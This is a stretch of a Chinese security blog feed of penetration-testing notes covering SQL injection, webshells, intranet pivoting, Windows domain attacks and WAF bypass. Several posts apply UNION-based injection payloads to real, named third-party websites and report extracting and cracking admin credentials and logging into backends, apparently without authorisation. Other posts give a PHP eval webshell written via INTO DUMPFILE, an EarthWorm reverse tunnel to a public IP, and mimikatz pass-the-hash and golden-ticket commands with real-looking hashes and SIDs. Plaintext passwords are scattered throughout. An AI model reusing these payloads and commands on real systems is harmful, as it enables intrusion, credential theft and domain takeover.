<h2 id="4、综合扫描（X-scan）"><a href="#4、综合扫描（X-scan）" class="headerlink" title="4、综合扫描（X-scan）"></a>4、综合扫描（X-scan）</h2><blockquote>
<p>X-scan工具扫描主机存活、弱口令、SNMP等</p>
</blockquote>
<h2 id="5、综合扫描（Nessus）"><a href="#5、综合扫描（Nessus）" class="headerlink" title="5、综合扫描（Nessus）"></a>5、综合扫描（Nessus）</h2><blockquote>
<p>Nessus下载地址<a href="https://www.tenable.com/products/nessus" target="_blank" rel="noopener">https://www.tenable.com/products/nessus</a></p>
</blockquote>
<h2 id="6、手工信息收集"><a href="#6、手工信息收集" class="headerlink" title="6、手工信息收集"></a>6、手工信息收集</h2><blockquote>
<p>git导致文件泄露 访问.git/config发现未删除该文件，导致可以进行重塑网站源码 -&gt; 例如：<a href="http://192.168.15.36/zzcms8.2_1/.git/config" target="_blank" rel="noopener">http://192.168.15.36/zzcms8.2_1/.git/config</a><br>使用GitHack工具进行源码重塑</p>
</blockquote>
<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>1、网站漏洞扫描</p>
<blockquote>
<p>AWVS扫描工具</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>网络攻防工具</tag>
      </tags>
  </entry>
  <entry>
    <title>App渗透测试原理</title>
    <url>/2021/05/05/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="App渗透测试和Web渗透测试基本没有区别"><a href="#App渗透测试和Web渗透测试基本没有区别" class="headerlink" title="App渗透测试和Web渗透测试基本没有区别"></a>App渗透测试和Web渗透测试基本没有区别</h1><p>App其实就是手机软件，你们不需要害怕他，问一个简单的问题，用匿名的手机去访问我们的猫舍，难道他的SQL注入就不存在了吗？</p>
<p>大部分漏洞的存在并不是在客户端而是在服务器</p>
<p>例如：SQL注入、验证码绕过、XSS、越权漏洞、支付漏洞、CSRF、变量覆盖、反序列化、文件包含、SSRF、XXE、文件上传等等</p>
<p>其实我们可以再换一个思路，渗透测试网站，其实核心是控制传参访问对吗？如果说我们不对他进行访问和传参，那么他有可能被你渗透攻击下来吗？</p>
<p>那么渗透测试的核心其实就是把控传参，其实和App交互的还是服务器，用的还是HTTP协议，交互的服务器还是同一个，网站和App和同一个服务器交互都是很正常的事情【一般都是用Api通信例如】switch.api.caohua.com/api/t</p>
<p>正常网站的交互 ：浏览器 -&gt; 网站</p>
<p>App的交互 ： App  - &gt; 网站</p>
<p> 我们既然可以抓网站的数据包，那么我们能否抓App的数据包</p>
<p>1、显示打码了，但是源码没有打码</p>
<p>很多App访问地址是写死的。写死在源码里面</p>
<p>App也是有服务端的<br>    客户端  |  服务端<br>    个人APP |  服务器</p>
<hr>
<p>实验工具：夜神模拟器</p>
<p>burp抓包设置</p>
<p><img src="https://i.loli.net/2021/05/09/iaUu4Ad2Ylvk7EB.png" alt="image-20210509163010033"></p>
<p><img src="https://i.loli.net/2021/05/09/EbMjIxhCRBWUO4g.png" alt="image-20210509163140870"></p>
<p>App木马</p>
<p>1、MSF（快速渗透测试框架攻击）</p>
<p>App：</p>
<p>​    就是套了个浏览器</p>
<p><a href="http://www.bslyun.com/" target="_blank" rel="noopener">http://www.bslyun.com/</a></p>
<hr>
<p><strong>Xposed框架APK安装</strong></p>
<p>雷电模拟器会比夜神好一点</p>
<p>App:</p>
<p>脱壳、逆向、重打包、签名</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>注入漏洞1</title>
    <url>/2021/05/02/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞URL：http-www-scichi-cn-blog-viewblog-php-id-708"><a href="#漏洞URL：http-www-scichi-cn-blog-viewblog-php-id-708" class="headerlink" title="漏洞URL：http://www.scichi.cn/blog/viewblog.php?id=708"></a>漏洞URL：<a href="http://www.scichi.cn/blog/viewblog.php?id=708" target="_blank" rel="noopener">http://www.scichi.cn/blog/viewblog.php?id=708</a></h2><p><strong>第一步、对漏洞URL中id传参进行payload构造<em>联合查询注入</em></strong></p>
<p>*<em>Payload: id=-3108 UNION ALL SELECT CONCAT(0x71787a7171,0x57474269744a427a50627850784a7243656a6a6166507446495951504274755a695763614b515875,0x716a6a7171)– —-<br>*</em></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-c8782850e28b73f8bc515ff4465a5c66.png!small" alt="image.png"><br>*</em></p>
<p><strong>第二步、获取数据库信息和管理员账号和密码</strong></p>
<p><strong>（1）表名证明</strong></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-cb0a794af8be8a7fa5e4d44438e935d7.png!small" alt="image.png"><br>*</em></p>
<p><strong>（2）管理员账号和密码</strong></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-0e5f752a5260ca4b25bf013debfffdbc.png!small" alt="image.png"><br>*</em></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入实战</title>
    <url>/2021/04/20/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqlmap注入实战"><a href="#sqlmap注入实战" class="headerlink" title="sqlmap注入实战"></a>sqlmap注入实战</h1><blockquote>
<p><strong>第一个漏洞值得记录：</strong></p>
<p><strong><em>想着用谷歌语法找找最简单的sql注入试试实战</em></strong></p>
</blockquote>
<h1 id="漏洞URL：http-www-igbt-leader-com-newsinfo-php-id-55"><a href="#漏洞URL：http-www-igbt-leader-com-newsinfo-php-id-55" class="headerlink" title="漏洞URL：http://www.igbt-leader.com/newsinfo.php?id=55"></a><strong>漏洞URL：<a href="http://www.igbt-leader.com/newsinfo.php?id=55" target="_blank" rel="noopener">http://www.igbt-leader.com/newsinfo.php?id=55</a></strong></h1><h2 id="1、判断id传参处明显存在SQL注入"><a href="#1、判断id传参处明显存在SQL注入" class="headerlink" title="1、判断id传参处明显存在SQL注入"></a><strong><em>1、判断id传参处明显存在SQL注入</em></strong></h2><p><img src="https://i.loli.net/2021/05/11/IAgwdumWevQzlyn.png" alt="image-20210511194512055"></p>
<h2 id="2、构造联合查询payload进行获取数据如下"><a href="#2、构造联合查询payload进行获取数据如下" class="headerlink" title="2、构造联合查询payload进行获取数据如下"></a><strong>2、构造联合查询payload进行获取数据如下</strong></h2><h2 id="Payload-id-9845-UNION-ALL-SELECT-NULL-NULL-NULL-NULL-NULL-NULL-CONCAT-0x7178786271-0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542-0x7170706a71-–"><a href="#Payload-id-9845-UNION-ALL-SELECT-NULL-NULL-NULL-NULL-NULL-NULL-CONCAT-0x7178786271-0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542-0x7170706a71-–" class="headerlink" title="Payload: id=-9845 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542,0x7170706a71)– -"></a>Payload: id=-9845 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542,0x7170706a71)– -</h2><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210511194541891.png" alt="image-20210511194541891"></p>
<h2 id="3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密"><a href="#3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密" class="headerlink" title="3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密"></a><strong>3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密</strong></h2><p><img src="https://i.loli.net/2021/05/11/LGvc8zIhMsYEyS5.png" alt="image-20210511193811479"><br><img src="https://i.loli.net/2021/05/11/RiUIHmnszoW3x75.png" alt="image-20210511193925506"><br><img src="https://i.loli.net/2021/05/11/61YaneTsZRHvO8V.png" alt="image-20210511194002847"></p>
<h2 id="4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力"><a href="#4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力" class="headerlink" title="4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力"></a><strong>4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力</strong></h2><p><img src="https://i.loli.net/2021/05/11/1zh6g7NZ5xp4bAa.png" alt="image-20210511194227463"></p>
<p>1、对新闻页面进行传参测试</p>
<p><img src="https://i.loli.net/2021/04/21/Bu5FpYItEDS93ZO.png" alt="image-20210421090845992"></p>
<p>2、错误传参无显示</p>
<p><img src="https://i.loli.net/2021/04/21/rFtylgILipajf7D.png" alt="image-20210421091004618"></p>
<p>3、判断可能存在SQL注入出现数据库泄露后台密码</p>
<p><img src="https://i.loli.net/2021/04/21/Sxo9FvCIhHjl1w7.png" alt="image-20210421091156279"></p>
<p><img src="https://i.loli.net/2021/04/21/jSWHt7uZYLgVcas.png" alt="image-20210421091215552"></p>
<p><img src="https://i.loli.net/2021/04/21/OacZeu8EmoKbd9k.png" alt="image-20210421091401894"></p>
<p>4、直接可以登录后台</p>
<p><img src="https://i.loli.net/2021/04/21/qA2XgDWTbP3Chd4.png" alt="image-20210421091514101"></p>
<p><a href="http://www.shbtpm.com/webinfo.php?InfoID=1&amp;LX=1" target="_blank" rel="noopener">http://www.shbtpm.com/webinfo.php?InfoID=1&amp;LX=1</a></p>
<p>URL：<a href="http://www.caep-scns.ac.cn/HPCMid_js.php?id=757" target="_blank" rel="noopener">http://www.caep-scns.ac.cn/HPCMid_js.php?id=757</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/2021/04/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<p>1、重原理，轻测试</p>
<p>内网渗透的课程 </p>
<p><strong>1、主要是思路和操作为主</strong></p>
<p>靶场作为切入点</p>
<p>SQL注入可以干什么？</p>
<p><strong>获取数据、读取文件 影响数据库。</strong></p>
<p><strong>其实SQL注入是可以getshell写一句话木马</strong></p>
<p>SQL语句：导出文件：</p>
<p>​    into out file<br>​    into dumpfile</p>
<p>如果有堆叠注入 [通过日志的方法写webshell]</p>
<p><a href="http://192.168.136.129/?id=1%20unino%20select%201,%27%3C?php%20eval($_REQUEST[a])?%3E%27%20into%20dumpfile%20%27C:\\phpStudy1\\PHPTutorial\\WWW\123.txt%27" target="_blank" rel="noopener">http://192.168.136.129/?id=1%20unino%20select%201,%27%3C?php%20eval($_REQUEST[a])?%3E%27%20into%20dumpfile%20%27C:\\phpStudy1\\PHPTutorial\\WWW\123.txt%27</a></p>
<p><a href="http://192.168.136.129/?id=1.111" target="_blank" rel="noopener">http://192.168.136.129/?id=1.111</a> union select 1,0x3c3f706870206576616c28245f524551554553545b615d293f3e into dumpfile ‘C:/phpStudy1/PHPTutorial/WWW/123.php’</p>
<p>一台服务器搭建了两个网站</p>
<p>A网站是低权限运行的 webshell =&gt; 低权限  可以通过PHP往B网站写东西 写一个马</p>
<p>B网站是高权限运行的  webshell =&gt; 高权限了</p>
<hr>
<p>很多时候渗透测试人员，在做渗透测试的时候，拿到了网站权限，会发现，网站的权限调用的CMD命令，其实并不是服务器管理权限，这个时候后就需要去想办法提升自己的权限，只有自己的权限够了，才可以更好的做内网测试。</p>
<p>提权的路线其实不止一个</p>
<p><strong>不同服务组件用了不同权限。例如网站权限低，数据库权限高，那么我们就要想办法让其他组件帮我们去做事。再例如：目标及其上运行了一些其他的服务，然后这些服务只能从内部访问，然后我们也可以调用过来用。（例如：FTP|Redis等等）</strong>[这个需要一定的知识积累，早期不推荐]</p>
<p>有用的cmd命令： </p>
<blockquote>
<p>whoami <strong>查看当前用户权限</strong></p>
<p>netstat -ano <strong>查看本机开放的端口</strong></p>
<p>tasklist <strong>查看本机运行的程序[类似于任务管理器]</strong></p>
<p>systeminfo <strong>查看计算机信息</strong></p>
</blockquote>
<h2 id="利用windows的漏洞（最常见手法）"><a href="#利用windows的漏洞（最常见手法）" class="headerlink" title="利用windows的漏洞（最常见手法）"></a>利用windows的漏洞（最常见手法）</h2><p><strong>查看windows打了什么补丁，然后去网上找存在什么样的漏洞，然后找对应的提权工具</strong></p>
<p>widnows打了补丁什么漏洞我又不清楚，我怎么找？其实有前辈做了很好的东西 访问：提权辅助页面：<a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">http://bugs.hacking8.com/tiquan/</a></p>
<p>查看到补丁号填入，然后点击查询就可以，然后告诉你哪些漏洞可以用，直接去找这个微软编号的利用工具</p>
<p>net user nf 密码 /add</p>
<p>net localgroup administrators nf /add 提升管理员权限</p>
<p>3389登陆 一个公网ip内存在N多个机器</p>
<p>公网端口<br>端口转发、映射</p>
<p>内网端口 netstat -ano 看到的是内网端口</p>
<p>被攻击机器A 主动访问一台 公网B机器 是不是就可以建立连接了？</p>
<p>​    内网三台机器 </p>
<p>​    A机器、B机器、C机器</p>
<p>A机器的3389放出来  可以直接连接<br>B机器、C机器都在我手上，但是他们没有外网</p>
<p>EarthWorm</p>
<p>ew_win32.exe</p>
<p>建立反向代理 ew -s rssocks -d 103.46.128.53 -e 15906 将自己反向连接到103.46.128.53的15906端口</p>
<p>接受代理  ew -s rcsocks -l 4545 -e 80 监听80端口， 将获取的数据转发到4545端口</p>
<p>目标机器 —&gt; 路由器 -&gt; 穿透工具提供的平台 -&gt; 我</p>
<p>端口 - &gt; 不是开了就可以构成连接。 【访问到】服务</p>
<p>7 ~+I|lu}3wuA31|vvl</p>
<p>12 c373bf48.IE</p>
<p><strong>SQL注入可以干什么？</strong></p>
<p>|- 获取数据、读取文件 影响数据库。<br>|- 其实SQL注入是可以getshell  写一句话木马</p>
<p>SQL语句：导出文件</p>
<p>|- into outfile   </p>
<p>|- into dumpfile</p>
<h1 id="本地搭建phpstudy测试"><a href="#本地搭建phpstudy测试" class="headerlink" title="本地搭建phpstudy测试"></a>本地搭建phpstudy测试</h1><blockquote>
<p><strong>注意：前提是开启了dumpfile 和 Outfile  不然会报错、具体如何开启自行百度</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/kl5yqGnY8wHOrEP.png" alt="image-20210425102915152"></p>
<blockquote>
<p><strong>本地明显导入了123</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/vWSjBU98DTqXgrc.png" alt="image-20210425103040959"></p>
<blockquote>
<p>我们尝试导入一句话php测试“<?php eval($_REQUEST[a]); ?>” 注意用引号</p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/7mnTI5uSDCjfA4g.png" alt="image-20210425103359467"></p>
<p><img src="https://i.loli.net/2021/04/25/PunIqXazHMt7Y2W.png" alt="image-20210425103435470"></p>
<blockquote>
<p>导入成功，用本地测试是否有用</p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/ZruVHjmnz3Rh8kA.png" alt="image-20210425103518030"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php eval($_REQUEST[a]); ?&gt;"</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\phpStudy1\\PHPTutorial\\WWW\\15.php'</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>利用内网穿透、ew、proxifier，Nmap端口扫描到192.168.0.4主机已经开启，进入发现存在安全狗老版的可以绕过 </p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/uj4cLtFd5Mv2CNR.png" alt="image-20210425104153848">‘’</p>
<p>privilege::debug token::elevate lsadump::sam 从lsass.exe进程获取 privilege::debug sekurlsa::logonpasswords</p>
<p>1q2w3e4r.</p>
<p>o%JTey4$(D0y7&lt;4RK</p>
<p>端口的转发 抓取密码</p>
<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><blockquote>
<p>很多漏洞都是为了管理员方便，都是为了偷懒而产生，所以体验感和安全永远在对立面，越方便，越危险！！！</p>
<p>内网里面有很多机器，例如：几百台，上千台电脑，但是计算机管理员仅仅只有几个人，如果他们想对所有电脑进行更新升级，是不是要累死？一台一台的操作过去，我估计得吐血</p>
<p>windows的开发也是考虑到了这个问题，所以windows中有一个域的功能。</p>
<p>域其实就是一些计算机所组成的。一歌电脑也能是一个域，一堆电脑也可以是一个域。</p>
<p>域中的机器并不平等，分为控制机和客户机，控制机的权限很大，可以操作域中任意机器，它被叫为域控制器，俗称域控（DC），拿下域控，就等于拿下所域里面所有的机器。对于黑客而言，拿下域控也是攻击的最终极目标</p>
<p>域比较复杂，分为单域、父域、子域、域树、域森林等概念 对于初期渗透测试人员而言，其实都差不多。</p>
<p>我们的目标是域控，那么我们肯定要对域有一定的了解，域作为windows的一个功能，我们为何不尝试自建一个域，来方便我们测试和学习？</p>
</blockquote>
<p>域的搭建超级简单：</p>
<p>准备两台服务器，我是虚拟机开了两台2008r2 然后进行安装</p>
<p>服务器管理器 -&gt; 添加角色 -&gt; Active Directory 域服务安装</p>
<p>选中角色运行安装向导就行 -&gt; 需要设置一个超级密码：这个地方设置尽量复杂</p>
<p>域搭建完成。</p>
<p>软件的开发，肯定要兼容性？</p>
<p>x86 32 系统  =&gt;<br>x64 64 系统 =&gt; 发现所有的x86都不能用了</p>
<p>早期版本的域  会兼容 win2003 =&gt;  windows 2008 </p>
<p>密码：shou446515184</p>
<p>域：肯定和DNS有关 zkaq.cn 我这台机器知道zkaq.cn吗？</p>
<p>1、知道【通过查询DNS服务器得知】默认情况下DNS服务器在不特殊设定的时候，自动分配沿用运营商的</p>
<p>设置DNS服务器，把使用的DNS服务器设置为内网的DNS服务器</p>
<p>DNS：192.168.4.15</p>
<p>2、不知道</p>
<p>A1B2C3!.Qa</p>
<p>sekurlsa::logonpasswords</p>
<p>打补丁 KB2871997 再修改注册列表</p>
<p>你们注册了封神台、注册了社区。</p>
<p>你们觉得通过数据库是否能看出你们的密码是什么？<br>他们会加密MD5加密已经是Low</p>
<p>密码学的核心 =&gt; 密文不可逆</p>
<p>盐值 = salt (随机数)</p>
<p>​    md5(md5($password).$salt) 不安全的加密</p>
<p>通过多次加密混淆然后形成一堆密文</p>
<p>DESKTOP-T7GJSKA</p>
<p>域控：A1B2C3!.Nf</p>
<p>客户机： A1B2C3!.Qa</p>
<p>域控的账号密码可以登录任意的域中的电脑</p>
<p>200台客户机 1台主控机【域控的账号密码】</p>
<p>Kerberos - &gt; KDC密钥分发中心 —&gt; AS 检验访问用户身份，看看你是谁，如果你的用户名存在AS对的数据库里面，那么就会给你一个随机64位的值，但是这个值是经过你的用户密码加密的，你得拿本本地自己密码解开，这个是用来通信的，你和TGS的沟通都会用这个密钥加密</p>
<p>TGS-&gt; 和目标机器进行交互，中间用AS提供的密钥加密，然后对你提供的密码进行校验</p>
<p>加密： 对称加密 【有一段密钥，谁拥有它就可以解码，加密】</p>
<p>明文传输密码是很危险的 【在中国移动，网站明文传输密码是高危漏洞】</p>
<p>AS -&gt; AS会给你一串密文 -&gt; 拿你的密码解 -&gt; 64位的随机数 -&gt; TGS的传输信息密钥</p>
<p>通信证-&gt; 票据</p>
<p>windows官方有工具可以提权【必须是administrator权限】 psexec提权</p>
<p>域控管理员会用自己的域控账号登陆客户机，那么我们就可以抓取到域控的账号和密码。但是密码并不一定抓取到的都是明文，如果是Windows server 2012以上的版本或者是打了KB2871997补丁就会抓取不到明文密码，虽然有密文，但是密文是不可逆的，基本上不可能解开</p>
<p>那该怎么利用？</p>
<p>这里就有一种方法叫做，哈希传递（PTH）pass-the-hash<br>哈希传递这是什么？</p>
<p>前几天在渗透时遇到了一个问题，SQL注入获取的MD5值解不开</p>
<p>经过漫长的代码审计：发现设置Cookie的时候，他的Cookie是可以计算的，根据便宜混淆值+用户名和密码的MD5只，然后计算成一串Cookie。我们不需要知道密码，只要算出COOkie就可以成功登陆。</p>
<p>有同学会问，为啥不加密直接计算，而是计算密码的Md5只，因为数据库不存储密码，他不知道呀</p>
<p>在登陆其他用户的时候，也会这样去计算类似的情况，所以你用哈希值就可以去登陆同密码的服务器，然后因为这里是域控的账号密码，那么你可以直接用这个登陆域控</p>
<p>e5f999da18a5ab80bc15ecfc84aca7d9</p>
<p>sekurlsa::pth /user:administrator /domain:”gylq.cn” /ntlm:</p>
<p>sekurlsa::pth /user:administrator /domain:”gylq.cn” /ntlm:285deb0940e1630b59d2cd9590fcbc91</p>
<p>域控名字：WIN-NQ8TV3JGSN1.gylq.cn</p>
<p>域渗透中其实有金银票据，一个是黄金票据，一个是白银票据。一个用的是域控用户账号，一个用的是krbtgt账户金票权限是最大的，我们主讲黄金票据。</p>
<p>krbtgt账户其实就是那个KDC密钥分发中心用超管密码，我们拿着那个票据，去访问客户机，客户机会认为们是KDC秘钥分发中心，所以直接给了最高的权限允许我们访问，一般管理员会修改域控机密码，但是很少有管理员修改krbtgt的密码。那我们看看怎么伪造这个黄金票据。</p>
<p>mimikatz_trunk票据获取工具</p>
<p>log -&gt; 记录</p>
<p>lsadump::dcsync /user:krbtgt 获取krbtgt的密码 [mimikatz 会模拟域控，向目标域控请求账号密码信息]</p>
<p>提取出里面的sid和hashNTLM  注意：这里的SID是不包含-502的，千万别把-502写进去</p>
<p>kerberos::golden /admin:administrator /domain:gylq.cn /sid:S-1-5-21-204603982-2387576990-164658498 /krbtgt:7fdd8ee73326c3a028bff7e196883142 /ticket:administrator.kiribi  [制作票据]</p>
<p>kerberos::ptt administrator.kiribi    [加载票据]</p>
<p>然后打开cmd试试看票据是否有用，可以访问域控吗？    提取东西在域控，伪造在客户机</p>
<p>SID   : S-1-5-21-204603982-2387576990-164658498-502<br>  Hash NTLM: 7fdd8ee73326c3a028bff7e196883142</p>
<p>Object Security ID   : S-1-5-21-204603982-2387576990-164658498-502<br>  Hash NTLM: 7fdd8ee73326c3a028bff7e196883142</p>
<p>kerberos::golden /admin:administrator /domain:gylq.cn /sid:S-1-5-21-204603982-2387576990-164658498 /krbtgt:7fdd8ee73326c3a028bff7e196883142 /ticket:administrator.kiribi</p>
<p>kerberos::ptt administrator.kiribi</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass-绕过阻挡我们的WAF</title>
    <url>/2021/04/15/bypass-%E7%BB%95%E8%BF%87%E9%98%BB%E6%8C%A1%E6%88%91%E4%BB%AC%E7%9A%84WAF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="本地搭建安全狗安装坑"><a href="#本地搭建安全狗安装坑" class="headerlink" title="本地搭建安全狗安装坑"></a>本地搭建安全狗安装坑</h1><p><strong>系统服务启动的坑</strong></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210438428-1068842948.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210657353-2013469585.png" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">管理员模式在apache目录执行</span><br><span class="line">httpd.exe -k install -n apache2.0</span><br><span class="line">如果要删除服务重新来，可以输下面这个，给你留着备用</span><br><span class="line">D:phpStudyApachebin&gt;httpd.exe -k install -n apache2.4</span><br><span class="line"></span><br><span class="line">sc delete apache2.0</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210621993-1257692856.png" alt=""></p>
<h1 id="简介WAF"><a href="#简介WAF" class="headerlink" title="简介WAF"></a>简介WAF</h1><p><strong>WAF是一个缩写，全名web应用防护系统（Web Application Firewall），是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品</strong></p>
<p><strong>Waf有硬件类型也有软件类型的，但是其实在我看来，从绕过Waf机制上来说，区别不大，我们一般渗透测试都会遇到软Waf，因为硬件waf价格有点昂贵，正常企业不会购买，所以基本是GOV站点或者国网、运营商等国企才会大规模装配。</strong></p>
<p><strong>常见的软Waf，：安全狗、云锁、云盾、悬镜、护卫神</strong></p>
<h1 id="bypass是什么？"><a href="#bypass是什么？" class="headerlink" title="bypass是什么？"></a><strong>bypass是什么？</strong></h1><p>bypass他就是绕过的意思，我们渗透测试人员通过特殊语句的构建进行渗透测试，然后达到绕过waf的手法</p>
<blockquote>
<p>waf检测机制其实很简单，核心就是正则匹配，虽然说还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。</p>
</blockquote>
<hr>
<p><strong>waf的核心，通过正则匹配，如果符合规则，就拦截。 and 1=1 拦截</strong></p>
<p>and 1=1 =&gt; And 1=1 =&gt; 因为Waf获得数据之后不会去解码 </p>
<p>and 1=1</p>
<p>and =&gt;&amp;<br>1=1 =&gt; -1=-1 </p>
<p>/**/ 数据库注射</p>
<p>/*!*/内联注释//可以运行 最新版被拦截</p>
<p>union select =&gt; union /*10044!select*/ <strong>最新版基本被拦截</strong></p>
<p>/*%0a */</p>
<p>– qwe /*%0a</p>
<p>  – qwe/* %0a union select 1,2 from admin limit 1,1 – qwe*/</p>
<p>内联注释<br>特殊字符 =&gt; %0a 换行</p>
<p>iis  传参里面 s%e%l%e%c%t =&gt; select<br>Apache Hpp</p>
<p><a href="http://192.168.136.129/?id=1/\*&amp;id=2%23*/" target="_blank" rel="noopener">http://192.168.136.129/?id=1/\*&amp;id=2%23*/</a></p>
<p><a href="http://59.63.200.79:8003/?id=1/\*&amp;id=2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1/\*&amp;id=2</a> union select 1,2 from admin limit 1,1#*/</p>
<hr>
<blockquote>
<p><strong>记住一句话，安全和客户体验都是需要平衡的，特别是对于Waf而言，你想像，用了waf之后，然后网页动不动就拦截，比如我是用户，然后因为我用户名叫and然后我就被拉黑了，因为我不小心输入个’页面就出问题，这个当然不可以，所以waf一般都是通用的，并不是单独定制的，既然是通用的，那么他拦截上会比较谨慎，所以waf的正则一般是搭配的。’</strong></p>
</blockquote>
<p><strong>我们既然知道waf通过正则匹配，那么你们第一个反应就是，替换函数对不对  例如：id= 1 and 1=1 waf对and进行了拦截，那么我们是不是得尝试找到替换and的东西，那么运算符就能帮上我们，例如：&amp;</strong></p>
<blockquote>
<p>但是输入时候我们发现只写and是不会被拦截的，那么我们想办法改一改 1=1，可以试试-1=-1</p>
</blockquote>
<p><strong>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过这个waf</strong></p>
<p>这里要讲一个东西叫做内联注释。</p>
<p><strong>内联注释是Mysql为了保持与其他数据兼容，将Mysql中特有的语句放在/*!…<em>/中，这些语句在不兼容的数据库中不执行，而在mysql自身却能识别，执行。/\</em>!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行</strong></p>
<h1 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h1><p><strong>1、大小写绕过（很老的waf才有用）</strong></p>
<p><strong>2、替换绕过（很老的waf才有用）【和上传文件那个漏洞一样】</strong></p>
<p><strong>3、特殊字符绕过（%0a换行）</strong></p>
<p><strong>4、编码绕过（比如会多次解码的东西，例如我们DOM XSS绕狗那个）</strong></p>
<p><strong>5、等价替换（利用其它函数替代）[union #%0aselect 拦截] [uinon all #%0aselect 不拦截]</strong></p>
<p><strong>6、容器特性（例如Apache的hpp或者iis的%分割）</strong></p>
<p><strong>7、白名单（管理员权限或者是127.0.0.1本地访问不拦截）</strong></p>
<p><strong>8、缓冲区（数据太多了超出了waf检测的范围）</strong></p>
<hr>
<h1 id="Bypass-Sql注入绕过"><a href="#Bypass-Sql注入绕过" class="headerlink" title="Bypass Sql注入绕过"></a>Bypass Sql注入绕过</h1><p>Bypass webshell 的绕过 <strong>一句话木马 (webshell)</strong></p>
<p><strong><?php eval($_REQUEST[a]); ?></strong></p>
<p>=&gt; 替换 eval  替换$_REQUEST[a] =&gt; 超全局变量</p>
<p>​                    <strong>——笔录</strong></p>
<hr>
